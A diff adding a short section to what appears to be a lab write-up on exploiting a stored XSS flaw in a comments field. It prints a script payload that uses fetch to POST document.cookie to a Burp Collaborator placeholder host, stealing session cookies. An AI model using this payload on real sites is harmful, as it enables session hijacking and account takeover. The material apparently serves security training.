@@ -46,3 +46,15 @@ function handleResponse() {
 };
 </script>
 
+## Exploiting XSS to steal cookies
+There is an XSS vulnerability in the comments field. 
+We can inject a tag such as a script or malicious Javascript to efxiltrate the cookie to a C2 server.
+```
+<script>
+fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>
+``` 
